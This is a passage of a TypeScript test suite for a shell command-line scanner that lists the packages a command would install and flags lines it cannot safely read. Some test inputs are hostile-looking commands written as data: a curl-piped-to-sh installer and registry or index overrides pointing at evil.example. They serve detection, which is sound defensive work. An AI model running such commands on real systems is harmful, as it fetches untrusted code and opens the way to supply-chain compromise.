// The packages a shell command line installs, read like a POSIX shell splits it, without running anything.
import { describe, expect, it } from 'vitest';
import { scanCommandLine } from '../../src/check/command.ts';

const specs = (line: string) => scanCommandLine(line).requests.map((request) => `${request.tool}:${request.spec}`);

describe('scanCommandLine finds installed packages', () => {
  it.each([
    ['npm install lodash', ['npm:lodash']],
    ['npm i -D @types/node typescript@5', ['npm:@types/node', 'npm:typescript@5']],
    ['npm add lodash --save-exact', ['npm:lodash']],
    ['npm isntall lodash', ['npm:lodash']],
    ['npm --registry https://registry.npmjs.org/ install lodash', ['npm:lodash']],
    ['npm install -w packages/app lodash', ['npm:lodash']],
    ['npm install --workspace=packages/app lodash', ['npm:lodash']],
    ['npm -C sub i chalk', ['npm:chalk']],
    ['npm install', []],
    ['npm ci', []],
    ['npm run build', []],
    ['npm test -- --watch', []],
    ['npx cowsay hello', ['npm:cowsay']],
    ['npx -y create-vite@latest my-app --template react', ['npm:create-vite@latest']],
    ['npx --package=@npmcli/foo foo bar', ['npm:@npmcli/foo']],
    ['npx -p typescript tsc --init', ['npm:typescript']],
    ['npm exec --package typescript -- tsc --init', ['npm:typescript']],
    ['npm exec -- prettier --write .', ['npm:prettier']],
    ['npm x eslint', ['npm:eslint']],
    ['npm init vite@latest my-app', ['npm:create-vite@latest']],
    ['npm create @usr/foo', ['npm:@usr/create-foo']],
    ['npm init @usr', ['npm:@usr/create']],
    ['npm init', []],
    ['pnpm add -D vitest', ['pnpm:vitest']],
    ['pnpm --filter web add react', ['pnpm:react']],
    ['pnpm -C packages/app add zod', ['pnpm:zod']],
    ['pnpm i lodash', ['pnpm:lodash']],
    ['pnpm install', []],
    ['pnpm dlx create-vue my-app', ['pnpm:create-vue']],
    ['pnx --package=yo --package=generator-webapp yo webapp', ['pnpm:yo', 'pnpm:generator-webapp']],
    ['pnpx degit user/repo', ['pnpm:degit']],
    ['pnpm create vite my-app', ['pnpm:create-vite']],
    ['pnpm create create-foo', ['pnpm:create-foo']],
    ['yarn add lodash@^4', ['yarn:lodash@^4']],
    ['yarn add -D --mode skip-build esbuild', ['yarn:esbuild']],
    ['yarn dlx -p typescript -p ts-node ts-node -e x', ['yarn:typescript', 'yarn:ts-node']],
    ['yarn install', []],
    ['bun add zod --filter api', ['bun:zod']],
    ['bun add --catalog=testing vitest', ['bun:vitest']],
    ['bunx cowsay hi', ['bun:cowsay']],
    ['bun x --bun vite', ['bun:vite']],
    ['bun create remix my-app', ['bun:create-remix']],
    ['bun create user/template my-app', ['bun:user/template']],
    // -p is --production for bun add and --package for bunx.
    ['bun add -p zod', ['bun:zod']],
    ['bunx -p typescript tsc', ['bun:typescript']],
    // An add subcommand of any package manager is checked for all of them.
    ['bun install zod', ['bun:zod']],
    ['yarn create vite my-app', ['yarn:create-vite']],
    ['yarn create -p extra vite', ['yarn:extra', 'yarn:create-vite']],
    ['yarn create @scope/create-app', ['yarn:@scope/create-app']],
    ['pnpm create @scope/create-app', ['pnpm:@scope/create-app']],
    ['npm init @scope/create-app', ['npm:@scope/create-create-app']],
    ['yarn workspace web add -D react', ['yarn:react']],
    ['yarn workspace web run build', []],
    ['npx -c "npm install lodash"', ['npm:lodash']],
    ['npm exec --package eslint --call="eslint ."', ['npm:eslint']],
  ])('%s', (line, expected) => {
    expect(specs(line)).toEqual(expected);
    expect(scanCommandLine(line).unreadable).toBeUndefined();
  });
});

describe('scanCommandLine reads shell syntax', () => {
  it.each([
    ['cd app && npm install lodash', ['npm:lodash']],
    ['npm ci; npm install left-pad || echo failed', ['npm:left-pad']],
    ['echo start | npm i chalk > install.log 2>&1', ['npm:chalk']],
    ['(cd web && pnpm add react) && yarn add vue', ['pnpm:react', 'yarn:vue']],
    ['FOO=1 CI=true npm install lodash', ['npm:lodash']],
    ['sudo -u build npm install -g typescript', ['npm:typescript']],
    ['env NODE_ENV=production npm install express', ['npm:express']],
    ['corepack pnpm add zod', ['pnpm:zod']],
    ['bash -c "npm install lodash && npm test"', ['npm:lodash']],
    ['sh -lc \'npx cowsay hi\'', ['npm:cowsay']],
    ['npm install "lodash@>=4 <5"', ['npm:lodash@>=4 <5']],
    ['npm install lodash@\'^4.17.0\'', ['npm:lodash@^4.17.0']],
    ['/usr/local/bin/npm install lodash', ['npm:lodash']],
    ['npm.cmd install lodash', ['npm:lodash']],
    ['npm install lodash # add lodash', ['npm:lodash']],
    ['npm install \\\n  lodash \\\n  chalk', ['npm:lodash', 'npm:chalk']],
    ['git commit -m "npm install lodash"', []],
    // A package manager later in the line runs under a command depcurfew does not know; echo and printf only print.
    ['echo npm install lodash', []],
    ['echo hello npm install left-pad', []],
    ["printf '%s\\n' npm i left-pad", []],
    ['strace -f npm install lodash', ['npm:lodash']],
    ['npx cross-env NODE_ENV=production npm install lodash', ['npm:cross-env', 'npm:lodash']],
    ['sudo --user root npm install lodash', ['npm:lodash']],
    ['timeout --signal KILL 10 npm install lodash', ['npm:lodash']],
    ['env --chdir /tmp npm install lodash', ['npm:lodash']],
    ['brew install yarn bun', []],
    ['which npm', []],
    ['npm install foo@>=1', ['npm:foo@']],
    // Command substitutions run before the command, so the commands inside them count.
    ['echo $(npm install lodash)', ['npm:lodash']],
    ['echo "$(npm install lodash)"', ['npm:lodash']],
    ['FOO=$(npm i lodash)', ['npm:lodash']],
    ['x=`npx cowsay`', ['npm:cowsay']],
    ['cat <(npm i lodash)', ['npm:lodash']],
    ['echo ${X:-$(npm i lodash)}', ['npm:lodash']],
    ['echo $(echo ")" && npm i lodash)', ['npm:lodash']],
    // Reserved words and function bodies.
    ['if true; then npm install lodash; fi', ['npm:lodash']],
    ['{ npm install lodash; }', ['npm:lodash']],
    ['for x in 1; do npm i lodash; done', ['npm:lodash']],
    ['while false; do pnpm add zod; done', ['pnpm:zod']],
    ['! npm i lodash', ['npm:lodash']],
    ['f() { npm i lodash; }; f', ['npm:lodash']],
    ['function f { npm i lodash; }', ['npm:lodash']],
    // Wrappers and command strings.
    ['eval "npm install lodash"', ['npm:lodash']],
    ['timeout 60 npm install lodash', ['npm:lodash']],
    ['timeout -s KILL 5m npm install lodash', ['npm:lodash']],
    ['nice -n 10 npm i lodash', ['npm:lodash']],
    ['env -S "npm install lodash"', ['npm:lodash']],
    ['corepack pnpm@9 add zod', ['pnpm:zod']],
    ['bash -e -o pipefail -c "npm i lodash"', ['npm:lodash']],
    ['bash -c "cd $DIR && npm test"', []],
    ['npx -c "eslint $DIR"', []],
    ['bash script.sh', []],
    ['bash <<EOF\nnpm install lodash\nEOF', ['npm:lodash']],
    ['xargs -n 1 echo < list.txt', []],
    // Here-documents are data unless a shell reads them; quotes in them do not open strings.
    ["cat <<EOF > notes.txt\nDon't forget\nEOF\nnpm i lodash", ['npm:lodash']],
    ["git commit -m \"$(cat <<'EOF'\nFix the parser, don't guess\nEOF\n)\" && npm i lodash", ['npm:lodash']],
    ['cat <<EOF > notes.md\nnpm install left-pad\nEOF', []],
    ['cat <<-EOF\n\tnpm install left-pad\n\tEOF\nnpm i lodash', ['npm:lodash']],
    ['cat <<EOF\n$(npm i lodash)\nEOF', ['npm:lodash']],
    ["cat <<'EOF'\n$(npm i left-pad)\nEOF", []],
    ["bash <<< 'npm i lodash'", ['npm:lodash']],
    ['bash -O extglob -c "npm i lodash"', ['npm:lodash']],
    ['bash --rcfile x -c "npm i lodash"', ['npm:lodash']],
    // Arithmetic is not a here-document.
    ['echo $((1<<2))', []],
    ['((x = 1 << 2))\nnpm i lodash', ['npm:lodash']],
    // Commands that end in an add subcommand.
    ['yarn global add lodash', ['yarn:lodash']],
    ['yarn workspaces foreach -A add lodash', ['yarn:lodash']],
    ['pnpm -F app add zod', ['pnpm:zod']],
    // Shells behind other commands.
    ["npx -p cowsay sh -c 'npm i lodash'", ['npm:cowsay', 'npm:lodash']],
    ["npm exec -- sh -c 'npm i lodash'", ['npm:sh', 'npm:lodash']],
    ["pnpm dlx --package cowsay -c 'npm i lodash'", ['pnpm:cowsay', 'npm:lodash']],
    ["find . -name x -exec sh -c 'npm i lodash' \\;", ['npm:lodash']],
    ["flock /tmp/lock bash -c 'npm i lodash'", ['npm:lodash']],
    ["su -c 'npm i lodash' root", ['npm:lodash']],
    ['apt-get install -y sudo bash', []],
    ['which bash', []],
    // case patterns inside $(...).
    ['echo "$(case x in x) npm i lodash;; esac)"', ['npm:lodash']],
    // Test brackets and paths built from variables are not unreadable commands.
    ["bash -c '[ -f a ] && echo ok'", []],
    ['v=$([ -f a ] && echo yes)', []],
    ['out=$("$HOME/bin/tool" --version)', []],
    ['[[ -f x ]] && npm i lodash', ['npm:lodash']],
    // Deno.
    ['deno add lodash', ['deno:lodash']],
    ['deno install npm:chalk jsr:@std/path', ['deno:npm:chalk', 'deno:jsr:@std/path']],
    ['deno install -g -n tool npm:cowsay', ['deno:npm:cowsay']],
    ['deno install --entrypoint main.ts other.ts', []],
    ['deno install', []],
    // A glob in the version part does not make the spec unreadable.
    ['pnpm add @demo/api@workspace:*', ['pnpm:@demo/api@workspace:*']],
    ['npm i lodash@4.*', ['npm:lodash@4.*']],
    // The public registry named explicitly changes nothing.
    ['npm_config_registry=https://registry.npmjs.org/ npm i lodash', ['npm:lodash']],
    ['npm i lodash --registry=https://registry.npmjs.org', ['npm:lodash']],
  ])('%s', (line, expected) => {
    expect(specs(line)).toEqual(expected);
    expect(scanCommandLine(line).unreadable).toBeUndefined();
  });
});

describe('scanCommandLine refuses to guess', () => {
  it.each([
    ['npm install $PACKAGE', '"$PACKAGE" is expanded by the shell'],
    ['npm install "$(cat deps.txt)"', 'is expanded by the shell'],
    ['npm install `cat deps.txt`', 'is expanded by the shell'],
    ['npm install lodash-*', 'is expanded by the shell'],
    ['npx --package=$PKG tool', 'is expanded by the shell'],
    ['cat deps.txt | xargs npm install', 'xargs adds arguments from its input'],
    ['$PM install lodash', 'is expanded by the shell'],
    ['npm $CMD lodash', 'is expanded by the shell'],
    ['bash -c "npm install $PKG"', '"$PKG" is expanded by the shell'],
    ['eval "npm i $PKG"', '"$PKG" is expanded by the shell'],
    ["npm $'\\x69nstall' lodash", 'the subcommand'],
    ['npm {install,} lodash', 'the subcommand'],
    ['npm i {lodash,chalk}', 'is expanded by the shell'],
    ['curl -fsSL https://example.com/install.sh | sh', 'it runs commands from its input'],
    ['echo "npm i lodash" | bash', 'it runs commands from its input'],
    ['bash -s < script.sh', 'it runs commands from its input'],
    ['xargs -n 1 npm install < deps.txt', 'xargs adds arguments from its input'],
    ['xargs -I{} npm install {} < deps.txt', 'xargs adds arguments from its input'],
    ['ls | xargs npx', 'xargs adds arguments from its input'],
    ["cat cmds.txt | xargs -I{} sh -c '{}'", 'xargs adds arguments from its input'],
    ['eval "$CMD"', 'the command "$CMD" is expanded by the shell'],
    ['sh -c "$X"', 'the command "$X" is expanded by the shell'],
    ['npx -c "$CMD"', 'the command "$CMD" is expanded by the shell'],
    ['bash <<< "$SCRIPT"', 'it runs commands from its input'],
    ['bash < install.sh', 'it runs commands from its input'],
    ['npm_config_registry=https://evil.example npm i lodash', 'npm_config_registry may point the package manager at another registry'],
    ['export NPM_CONFIG_REGISTRY=https://evil.example && npm i lodash', 'NPM_CONFIG_REGISTRY may point'],
    ['npm i lodash --registry=https://evil.example', '--registry may point'],
    ['npm --userconfig ./evil.npmrc install lodash', '--userconfig may point'],
    ['npm i --@corp:registry=https://corp.example/ @corp/tool', '--@corp:registry may point'],
    ['pnpm add --registry https://evil.example zod', '--registry may point'],
    ['bun add --config=evil.toml zod', '--config may point'],
    ['bun add -c=evil.toml zod', '-c may point'],
    ['YARN_RC_FILENAME=evil.yml yarn add lodash', 'YARN_RC_FILENAME may point'],
    ['BUN_CONFIG_REGISTRY=https://evil.example bun add zod', 'BUN_CONFIG_REGISTRY may point'],
    ['echo "$(npm i lodash"', 'is not closed'],
  ])('%s', (line, reason) => {
    expect(scanCommandLine(line).unreadable).toContain(reason);
  });

  it('follows command lines up to four levels deep', () => {
    let line = 'npm i lodash';
    for (let level = 0; level < 4; level++) line = `eval ${JSON.stringify(line)}`;
    expect(scanCommandLine(line)).toEqual({ requests: [expect.objectContaining({ spec: 'lodash' })], unreadable: undefined });
    expect(scanCommandLine(`eval ${JSON.stringify(line)}`).unreadable).toContain('nested more than 4 levels deep');
  });

  it('does not ask about commands that install nothing', () => {
    expect(scanCommandLine('echo $HOME && ls *.json').unreadable).toBeUndefined();
    expect(scanCommandLine('$EDITOR notes.md').unreadable).toBeUndefined();
  });
});

describe('scanCommandLine finds Python packages', () => {
  it.each([
    ['pip install requests', ['pip:pypi:requests']],
    ["pip3 install 'requests>=2' flask==3.0", ['pip:pypi:requests>=2', 'pip:pypi:flask==3.0']],
    ['pip3.12 install -U requests', ['pip:pypi:requests']],
    ['python -m pip install requests', ['pip:pypi:requests']],
    ['python3.12 -I -W ignore -m pip install --user requests', ['pip:pypi:requests']],
    ['py -m pip install requests', ['pip:pypi:requests']],
    ['sudo python3 -m pip install requests', ['pip:pypi:requests']],
    ['pip --disable-pip-version-check install --upgrade requests', ['pip:pypi:requests']],
    ['pip install -r requirements.txt', []],
    ['pip install -rrequirements.txt requests', ['pip:pypi:requests']],
    ['pip install --constr constraints.txt requests', ['pip:pypi:requests']],
    ['pip install -c constraints.txt -t vendor requests', ['pip:pypi:requests']],
    ['pip install -e .', ['pip:pypi:.']],
    ['pip install -e ./lib -e mylib', ['pip:pypi:./lib', 'pip:pypi:./mylib']],
    ['pip install -Ue mylib', ['pip:pypi:./mylib']],
    ['pip install git+https://github.com/psf/requests', ['pip:pypi:git+https://github.com/psf/requests']],
    ['pip install -i https://pypi.org/simple requests', ['pip:pypi:requests']],
    ['pip uninstall -y requests', []],
    ['pip list', []],
    ['python -m venv .venv', []],
    ['python script.py install requests', []],
    ['uv add requests', ['uv:pypi:requests']],
    ["uv add 'httpx>=0.20' --dev --optional web", ['uv:pypi:httpx>=0.20']],
    ['uv add -m "python_version<\'3.12\'" tomli', ['uv:pypi:tomli']],
    ['uv add --editable ./lib', ['uv:pypi:./lib']],
    ['uv add --no-binary requests', ['uv:pypi:requests']],
    ['uv pip install requests', ['uv:pypi:requests']],
    ['uv pip install --no-binary :all: -e ./lib requests', ['uv:pypi:./lib', 'uv:pypi:requests']],
    ['uv pip install -r requirements.txt', []],
    ['uv --quiet pip install requests', ['uv:pypi:requests']],
    ['uv tool install ruff', ['uv:pypi:ruff']],
    ['uv tool install --with ruff-lsp,black ruff', ['uv:pypi:ruff-lsp', 'uv:pypi:black', 'uv:pypi:ruff']],
    ['uv tool install -e ruff', ['uv:pypi:ruff']],
    ['uvx ruff check .', ['uv:pypi:ruff']],
    ['uvx ruff@0.6.0 check', ['uv:pypi:ruff@0.6.0']],
    ["uvx --from 'ruff==0.6' ruff", ['uv:pypi:ruff==0.6']],
    ["uvx --with 'httpx>=0.2,<1' --with rich,typer black", ['uv:pypi:httpx>=0.2,<1', 'uv:pypi:rich', 'uv:pypi:typer', 'uv:pypi:black']],
    ['uvx -wrich black', ['uv:pypi:rich', 'uv:pypi:black']],
    ['uv tool run black .', ['uv:pypi:black']],
    ['uvx python -c "print(1)"', []],
    ['uvx pypy@3.10', []],
    ['uv run pytest', []],
    ['uv run --with rich python x.py', ['uv:pypi:rich']],
    ['uv run -m pip install evil', ['pip:pypi:evil']],
    ['uv run python -m pip install evil', ['pip:pypi:evil']],
    ['uv sync', []],
    ['uv lock --upgrade', []],
    ['poetry add requests@^2.0', ['poetry:pypi:requests@^2.0']],
    ['poetry add --group dev pytest pytest-cov', ['poetry:pypi:pytest', 'poetry:pypi:pytest-cov']],
    ['poetry add -Gdev pytest', ['poetry:pypi:pytest']],
    ['poetry -C sub add "requests[socks]>=2"', ['poetry:pypi:requests[socks]>=2']],
    ['poetry install --with dev', []],
    ['poetry update', []],
    ['pipx install black', ['pip:pypi:black']],
    ['pipx install --preinstall black-plugin -f black', ['pip:pypi:black-plugin', 'pip:pypi:black']],
    ['pipx run pycowsay moo', ['pip:pypi:pycowsay']],
    ["pipx run --spec 'black==24.1.0' black .", ['pip:pypi:black==24.1.0']],
    ['pipx run test.py', []],
    ['python -m pipx install black', ['pip:pypi:black']],
  ])('%s', (line, expected) => {
    expect(specs(line)).toEqual(expected);
    expect(scanCommandLine(line).unreadable).toBeUndefined();
  });
});

describe('scanCommandLine refuses to guess for Python', () => {
  it.each([
    ['pip install --index-url https://evil.example/simple requests', '--index-url may point'],
    ['pip install -ihttps://evil.example/simple requests', '-i may point'],
    ['pip install -Uihttps://evil.example/simple requests', '-i may point'],
    ['pip install --extra https://evil.example/simple requests', '--extra-index-url may point'],
    ['pip install --find-links ./wheels requests', '--find-links may point'],
    ['pip install --pypi-url=https://evil.example/simple requests', '--pypi-url may point'],
    ['PIP_INDEX_URL=https://evil.example/simple pip install requests', 'PIP_INDEX_URL may point'],
    ['export PIP_EXTRA_INDEX_URL=https://evil.example/simple && python -m pip install requests', 'PIP_EXTRA_INDEX_URL may point'],
    ['PIP_CONFIG_FILE=evil.conf pip install requests', 'PIP_CONFIG_FILE may point'],
    ['pip install $PKG', '"$PKG" is expanded by the shell'],
    ['uv add --index evil=https://evil.example/simple requests', '--index may point'],
    ['uv pip install --default-index https://evil.example/simple requests', '--default-index may point'],
    ['uv pip install -f ./wheels requests', '-f may point'],
    ['uvx --config-file evil.toml ruff', '--config-file may point'],
    ['UV_INDEX=https://evil.example/simple uv add requests', 'UV_INDEX may point'],
    ['uv run https://example.com/script.py', 'downloads and runs a script'],
    ['pipx run https://example.com/script.py', 'downloads and runs a script'],
    ['poetry add --source private requests', '--source may point'],
    ['pipx install --pip-args="--extra-index-url https://evil.example" black', '--pip-args may point'],
    ['pipx install --index https://evil.example/simple black', '--index-url may point'],
    ['python -m pip install --index-url "$INDEX" requests', 'is expanded by the shell'],
  ])('%s', (line, reason) => {
    expect(scanCommandLine(line).unreadable).toContain(reason);
  });

  it('accepts PyPI itself as the index', () => {
    expect(scanCommandLine('uv pip install --default-index https://pypi.org/simple/ requests').unreadable).toBeUndefined();
    expect(scanCommandLine('PIP_INDEX_URL=https://pypi.org/simple pip install requests').unreadable).toBeUndefined();
  });
});

describe('scanCommandLine reads PDM and Pipenv', () => {
  it.each([
    ['pdm add requests', ['pdm:pypi:requests']],
    ['pdm add -dG test pytest "httpx>=0.27"', ['pdm:pypi:pytest', 'pdm:pypi:httpx>=0.27']],
    ['pdm add -e ./libs/local --no-sync idna', ['pdm:pypi:./libs/local', 'pdm:pypi:idna']],
    ['pdm add --venv in-project requests', ['pdm:pypi:requests']],
    ['pdm install', []],
    ['pdm run pip install evil', ['pip:pypi:evil']],
    ['pipenv install requests', ['pipenv:pypi:requests']],
    ['pipenv install --dev "pytest>=8" -e mylib', ['pipenv:pypi:pytest>=8', 'pipenv:pypi:./mylib']],
    ['pipenv install', []],
    ['pipenv install -r requirements.txt', []],
    ['pipenv run pip install evil', ['pip:pypi:evil']],
  ])('%s', (line, expected) => {
    expect(specs(line)).toEqual(expected);
    expect(scanCommandLine(line).unreadable).toBeUndefined();
  });

  it.each([
    ['PDM_PYPI_URL=https://evil.example/simple pdm add requests', 'PDM_PYPI_URL may point'],
    ['pdm -c evil.toml add requests', '-c may point'],
    ['pipenv install -i https://evil.example/simple requests', '-i may point'],
    ['pipenv install --pypi https://evil.example/simple requests', '--pypi-mirror may point'],
    ['PIPENV_PYPI_MIRROR=https://evil.example/simple pipenv install requests', 'PIPENV_PYPI_MIRROR may point'],
    ['pipenv install --extra-pip-args="--extra-index-url https://evil.example" requests', '--extra-pip-args may point'],
  ])('%s', (line, reason) => {
    expect(scanCommandLine(line).unreadable).toContain(reason);
  });
});

describe('scanCommandLine reads options the way npm and pnpm do', () => {
  it.each([
    ['npm i --reg=https://evil.example/ foo', '--registry may point'],
    ['npm i --reg https://evil.example/ foo', '--registry may point'],
    ['npm i -reg=https://evil.example/ foo', '--registry may point'],
    ['npm i -registry=https://evil.example/ foo', '--registry may point'],
    ['npm i ---registry https://evil.example/ foo', '--registry may point'],
    ['npm --reg https://evil.example/ i foo', '--registry may point'],
    ['npx --reg=https://evil.example/ foo', '--registry may point'],
    ['npx -y --reg https://evil.example/ foo', '--registry may point'],
    ['npm exec --reg=https://evil.example/ -- foo', '--registry may point'],
    ['npm i --regis=https://evil.example/ foo', '--registry may point'],
    ['npm i --userc=/tmp/x foo', '--userconfig may point'],
    ['npm i --globalc /tmp/x foo', '--globalconfig may point'],
    ['npm i -@corp:registry=https://evil.example/ @corp/tool', '--@corp:registry may point'],
    ['pnpm add --reg=https://evil.example/ zod', '--registry may point'],
    ['pnpm add -registry https://evil.example/ zod', '--registry may point'],
    ['pnpm --regi=https://evil.example/ add zod', '--registry may point'],
    ['pnpm add --config.registry=https://evil.example/ zod', '--registry may point'],
    ['pnpm add --config.reg=https://evil.example/ zod', '--registry may point'],
    ['pnpm add --npmrc-auth-file=/tmp/evil.npmrc zod', '--npmrc-auth-file may point'],
    ['pnpm dlx --reg=https://evil.example/ cowsay', '--registry may point'],
    ['PNPM_CONFIG_NPMRC_AUTH_FILE=/tmp/evil.npmrc pnpm add zod', 'PNPM_CONFIG_NPMRC_AUTH_FILE may point'],
  ])('%s', (line, reason) => {
    expect(scanCommandLine(line).unreadable).toContain(reason);
  });

  it.each([
    // An exact flag is never taken for a prefix of an option with a value.
    ['npm i --save lodash', ['npm:lodash']],
    ['npm i --save-dev --no-save lodash', ['npm:lodash']],
    ['npm i -gD typescript', ['npm:typescript']],
    ['npm i -ws lodash', ['npm:lodash']],
    ['npm i --loglevel silent lodash', ['npm:lodash']],
    ['npm i -dd lodash', ['npm:lodash']],
    ['npm i --no-reg lodash', ['npm:lodash']],
    ['npm i -reg=https://registry.npmjs.org/ lodash', ['npm:lodash']],
    ['npx -y npm@latest install foo', ['npm:npm@latest', 'npm:foo']],
    // pnpm stops on options it does not know, so only registry options are resolved from a prefix.
    ['pnpm add --lockfile zod', ['pnpm:zod']],
    ['pnpm add -D --save-exact zod', ['pnpm:zod']],
    ['pnpm add --config.save-exact=true zod', ['pnpm:zod']],
  ])('%s', (line, expected) => {
    expect(specs(line)).toEqual(expected);
    expect(scanCommandLine(line).unreadable).toBeUndefined();
  });
});

/** The requests with what the command changes about the version or the build. */
const chosen = (line: string) =>
  scanCommandLine(line).requests.map((request) => ({
    spec: request.spec,
    ...(request.tag === undefined ? {} : { tag: request.tag }),
    ...(request.prereleases === undefined ? {} : { prereleases: request.prereleases }),
    ...(request.buildFromSource === undefined ? {} : { buildFromSource: request.buildFromSource }),
  }));

describe('scanCommandLine sees what changes the version or the build', () => {
  it.each([
    ['npm i --tag next foo', [{ spec: 'foo', tag: 'next' }]],
    ['npm i foo --tag=beta', [{ spec: 'foo', tag: 'beta' }]],
    ['npm --tag next install foo bar@^2', [{ spec: 'foo', tag: 'next' }, { spec: 'bar@^2', tag: 'next' }]],
    ['npm_config_tag=next npm i foo', [{ spec: 'foo', tag: 'next' }]],
    ['export NPM_CONFIG_TAG=canary && npx foo', [{ spec: 'foo', tag: 'canary' }]],
    ['npm_config_tag=next npm i --tag beta foo', [{ spec: 'foo', tag: 'beta' }]],
    ['pnpm add foo', [{ spec: 'foo' }]],
    ['pip install --pre foo', [{ spec: 'pypi:foo', prereleases: 'allow' }]],
    ['PIP_PRE=1 python -m pip install foo', [{ spec: 'pypi:foo', prereleases: 'allow' }]],
    ['PIP_PRE=0 pip install foo', [{ spec: 'pypi:foo' }]],
    ['pip install --only-final :all: foo', [{ spec: 'pypi:foo', prereleases: 'deny' }]],
    ['pip install --all-releases Foo_Bar foo-bar baz', [{ spec: 'pypi:foo-bar', prereleases: 'allow' }, { spec: 'pypi:baz' }]],
    ['uv add --prerelease allow foo', [{ spec: 'pypi:foo', prereleases: 'allow' }]],
    ['uvx --prerelease=disallow ruff', [{ spec: 'pypi:ruff', prereleases: 'deny' }]],
    ['uv add --prerelease allow --prerelease if-necessary foo', [{ spec: 'pypi:foo' }]],
    ['UV_PRERELEASE=allow uv pip install foo', [{ spec: 'pypi:foo', prereleases: 'allow' }]],
    ['uv add --prerelease-package foo=allow foo bar', [{ spec: 'pypi:foo', prereleases: 'allow' }, { spec: 'pypi:bar' }]],
    ['pdm add --pre foo', [{ spec: 'pypi:foo', prereleases: 'allow' }]],
    ['pdm add --pre --stable foo', [{ spec: 'pypi:foo', prereleases: 'deny' }]],
    ['pipenv install --pre foo', [{ spec: 'pypi:foo', prereleases: 'allow' }]],
    ['poetry add --allow-prereleases foo', [{ spec: 'pypi:foo', prereleases: 'allow' }]],
    ['pip install --no-binary :all: foo', [{ spec: 'pypi:foo', buildFromSource: true }]],
    ['pip install --no-binary=foo foo bar', [{ spec: 'pypi:foo', buildFromSource: true }, { spec: 'pypi:bar' }]],
    ['pip install --no-binary :all: --only-binary foo foo bar', [{ spec: 'pypi:foo', buildFromSource: false }, { spec: 'pypi:bar', buildFromSource: true }]],
    ['pip install --no-binary :all: --no-binary :none: foo', [{ spec: 'pypi:foo' }]],
    ['PIP_NO_BINARY=:all: pip install foo', [{ spec: 'pypi:foo', buildFromSource: true }]],
    ['PIP_NO_BINARY=:all: pip install --only-binary :all: foo', [{ spec: 'pypi:foo', buildFromSource: false }]],
    ['uv add --no-binary foo', [{ spec: 'pypi:foo', buildFromSource: true }]],
    ['uv add --no-binary --binary foo', [{ spec: 'pypi:foo', buildFromSource: false }]],
    ['uv pip install --no-binary :all: foo', [{ spec: 'pypi:foo', buildFromSource: true }]],
    ['uv tool install --no-binary-package foo foo bar', [{ spec: 'pypi:foo', buildFromSource: true }, { spec: 'pypi:bar' }]],
    ['UV_NO_BINARY=1 uvx ruff', [{ spec: 'pypi:ruff', buildFromSource: true }]],
    ["UV_NO_BINARY_PACKAGE='foo baz' uv add foo bar", [{ spec: 'pypi:foo', buildFromSource: true }, { spec: 'pypi:bar' }]],
    ['PDM_NO_BINARY=foo pdm add foo bar', [{ spec: 'pypi:foo', buildFromSource: true }, { spec: 'pypi:bar' }]],
    ['POETRY_INSTALLER_NO_BINARY=true poetry add foo', [{ spec: 'pypi:foo', buildFromSource: true }]],
    ['PIP_NO_BINARY=:all: pipenv install foo', [{ spec: 'pypi:foo', buildFromSource: true }]],
    ['PIP_PRE=1 pipx install black', [{ spec: 'pypi:black', prereleases: 'allow' }]],
  ])('%s', (line, expected) => {
    expect(chosen(line)).toEqual(expected);
    expect(scanCommandLine(line).unreadable).toBeUndefined();
  });

  it.each([
    ['npm i --tag $TAG foo', 'is expanded by the shell'],
    ['npm_config_tag=$TAG npm i foo', 'npm_config_tag is set to a value the shell expands'],
    ['pip install --no-binary "$X" foo', 'is expanded by the shell'],
    ['PIP_NO_BINARY=$X pip install foo', 'PIP_NO_BINARY is set to a value the shell expands'],
  ])('%s', (line, reason) => {
    expect(scanCommandLine(line).unreadable).toContain(reason);
  });
});

describe('scanCommandLine follows package managers behind runners and wrappers', () => {
  it.each([
    ['npx npm@11 i foo', ['npm:npm@11', 'npm:foo']],
    ['bunx npm@11 i foo', ['bun:npm@11', 'npm:foo']],
    ['pnpm dlx pnpm@10 add foo', ['pnpm:pnpm@10', 'pnpm:foo']],
    ['uvx pip@25 install foo', ['uv:pypi:pip@25', 'pip:pypi:foo']],
    ['pipx run pip==25.0 install foo', ['pip:pypi:pip==25.0', 'pip:pypi:foo']],
    ['strace pip3.12 install foo', ['pip:pypi:foo']],
    ["su - root -c 'npm i foo'", ['npm:foo']],
    ["su root -c 'npm i foo'", ['npm:foo']],
    ["su -lc 'npm i foo' root", ['npm:foo']],
    ["runuser -c 'npm i foo' bob", ['npm:foo']],
    ['runuser -u bob -- npm i foo', ['npm:foo']],
    ['script -qc "npm i foo" /dev/null', ['npm:foo']],
    ['script --command="npm i foo" /dev/null', ['npm:foo']],
    ['flock /tmp/l -c "npm i foo"', ['npm:foo']],
    ['flock -w 5 /tmp/l npm i foo', ['npm:foo']],
    ["ash -c 'npm i foo'", ['npm:foo']],
    ["mksh -c 'npm i foo'", ['npm:foo']],
    ['pwsh -c "npm i foo"', ['npm:foo']],
    ['pwsh -NoProfile -Command npm i foo', ['npm:foo']],
    ['powershell -ExecutionPolicy Bypass -Command "npm i foo"', ['npm:foo']],
    ['powershell.exe "npm i foo"', ['npm:foo']],
    ['pwsh ./build.ps1', []],
    ['source /dev/stdin <<< "npm i foo"', ['npm:foo']],
    [". /dev/stdin <<< 'npm i foo'", ['npm:foo']],
    ["bash /dev/stdin <<< 'npm i foo'", ['npm:foo']],
    ['source .venv/bin/activate && pip install foo', ['pip:pypi:foo']],
    ["find . -name package.json -execdir npm i foo \\;", ['npm:foo']],
    ['find . -exec npm i foo +', ['npm:foo']],
    // Programs fed by a pipe run code depcurfew does not read, unless the code is on the command line or in a file.
    ["cat data.json | python3 -c 'import json, sys; print(json.load(sys.stdin))'", []],
    ['cat data.json | python3 tools/report.py', []],
    ["echo '{}' | node -e 'process.stdin.pipe(process.stdout)'", []],
    ['python3 --version && node --version', []],
    ['python3 -c "import sys; print(sys.version)"', []],
    ['node -e "console.log(process.env.HOME)"', []],
    ['python3 -c "print(\'$HOME\')"', []],
    ['pnpm add --loglevel error lodash', ['pnpm:lodash']],
    ['pnpm add --reporter silent lodash', ['pnpm:lodash']],
    ['pnpm add --reporter=append-only lodash', ['pnpm:lodash']],
    ["python3 - <<'EOF'\nprint(1)\nEOF", []],
    // Deno runs npm packages with deno x and its dx alias.
    ['deno x npm:cowsay hello', ['deno:npm:cowsay']],
    ['deno x -p typescript tsc --init', ['deno:typescript']],
    ['deno x --allow-read --allow-net npm:serve .', ['deno:npm:serve']],
    ['deno x --config deno.json -A npm:create-vite my-app', ['deno:npm:create-vite']],
    ['deno x npm:typescript@5/tsc', ['deno:npm:typescript@5']],
